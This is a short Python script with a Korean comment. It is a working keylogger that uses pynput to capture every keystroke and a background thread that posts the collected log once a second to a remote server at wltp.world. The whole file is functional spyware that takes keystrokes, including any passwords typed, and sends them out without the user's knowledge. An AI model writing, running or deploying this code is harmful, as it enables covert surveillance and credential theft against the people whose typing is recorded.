from pynput.keyboard import Listener, Key
import requests
import threading
import time

server_url = 'http://www.wltp.world:3256/get_logs'
logs = ''
lock = threading.Lock()

def send_logs():
    global logs
    while True:
        time.sleep(1)  # 1초마다 서버로 로그 전송
        lock.acquire()
        if logs:
            try:
                requests.post(server_url, data={'logs': logs})
                logs = ''
            except:
                print('Server error!')
        lock.release()

def on_press(key):
    global logs
    lock.acquire()
    logs += str(key).replace("'", "") + ", "
    lock.release()

if __name__ == '__main__':
    sender_thread = threading.Thread(target=send_logs, daemon=True)
    sender_thread.start()

    with Listener(on_press=on_press) as listener:
        listener.join() 
